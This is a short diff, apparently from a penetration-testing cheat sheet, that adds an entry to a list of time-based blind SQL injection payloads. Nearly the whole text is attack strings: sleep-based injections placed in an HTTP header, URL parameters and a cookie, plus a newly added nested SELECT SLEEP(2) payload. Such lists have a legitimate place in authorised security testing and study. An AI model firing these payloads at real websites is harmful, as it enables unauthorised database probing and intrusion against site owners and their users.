@@ -10,7 +10,9 @@ ___
 ```sql
 X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers
 
-&topsort=flowers or sleep(3) >> Url
+&topsort=flowers or sleep(3) >> Url Parameter
+
+/etc/example?term=')+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)+AND+(1=' >> Url Parameter
 
 &location=(select*from(select(sleep(3)))a) >> Cookie
 
